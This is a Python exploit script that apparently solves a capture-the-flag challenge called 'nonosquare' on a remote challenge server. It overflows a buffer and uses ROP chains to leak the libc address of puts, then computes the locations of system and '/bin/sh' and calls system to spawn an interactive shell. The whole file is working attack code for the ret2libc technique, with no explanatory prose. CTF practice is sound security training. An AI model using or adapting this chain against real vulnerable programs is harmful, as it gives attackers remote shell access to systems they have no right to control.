import sys
sys.dont_write_bytecode = True

from ropgen import ROP
from pwnscript import *

bin_name = b"./nonosquare"

reading_func = 0x000000000401247
puts_got = 0x0404018
puts_plt = 0x0401060

r = ROP(bin_name)
r.initialize()

# Payload 1
# Leaking the puts got address to find the libc base
r.padding(56)
r.set_regs({"rdi": puts_got})
r.ret_pad()
r.call(puts_plt)

# Calling the function again which gets the user input so that we can
# provide the second payload
r.call(reading_func)

p = Remote("challenges.uactf.com.au", 30003)

p.getline(b"This is going to be fun... is it?")

p.putline(r.generate())

p.getline(b"Did you have fun?")
puts = struct.unpack("<Q", p.getline()[:-1].ljust(8, b'\0'))[0]

libc = puts - 0x000000000084420

system = libc + 0x0000000000052290
bin_sh = libc + 0x00000000001B45BD

print(f"PUTS: {puts:#08x}")
print(f"LIBC: {libc:#08x}")

p.getline("This is going to be fun... is it?")

r.clean()

# Payload 2
# Calling system with /bin/sh
r.padding(56)
r.set_regs({"rdi": bin_sh})
r.call(system)

r.print_chain()

p.putline(r.generate())

p.interactive()
